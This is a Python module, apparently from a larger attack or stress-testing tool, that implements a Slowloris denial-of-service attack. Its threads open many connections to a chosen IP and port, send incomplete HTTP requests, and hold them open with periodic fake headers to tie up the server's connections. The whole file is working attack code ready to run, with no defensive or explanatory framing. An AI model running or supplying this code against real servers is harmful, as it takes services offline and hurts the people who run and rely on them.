import socket
import threading
import time
import random
from .utils import Statistics

class Slowloris:
    def __init__(self):
        self.stop_flag = False
        self.stats = Statistics()
        self.connections = []
    
    def start_attack(self, ip, port, threads=100, duration=30):
        self.stop_flag = False
        self.stats = Statistics()
        self.stats.start()
        
        def create_connection():
            while not self.stop_flag:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((ip, port))
                    
                    # Send partial HTTP request (never complete it)
                    session_id = random.randint(10000, 99999)
                    s.send(f"GET /?session={session_id} HTTP/1.1\r\n".encode())
                    s.send(f"Host: {ip}\r\n".encode())
                    s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                    s.send(f"Accept: text/html,application/json\r\n".encode())
                    # DON'T send final \r\n\r\n - connection hangs
                    
                    self.connections.append(s)
                    self.stats.add_connection()
                    self.stats.add_packet(150)
                    
                    # Keep connection alive by sending headers periodically
                    while not self.stop_flag:
                        try:
                            s.send(f"X-KeepAlive: {time.time()}\r\n".encode())
                            self.stats.add_packet(30)
                            time.sleep(5)
                        except:
                            break
                            
                except:
                    self.stats.add_error()
                    time.sleep(0.1)
        
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=create_connection, daemon=True)
            t.start()
            thread_list.append(t)
        
        time.sleep(duration)
        self.stop_flag = True
        
        # Close all connections
        for s in self.connections:
            try: s.close()
            except: pass
        
        for t in thread_list:
            t.join(timeout=2)
        
        return self.stats.get_report()
    
    def stop_attack(self):
        self.stop_flag = True
        for s in self.connections:
            try: s.close()
            except: pass
        return True
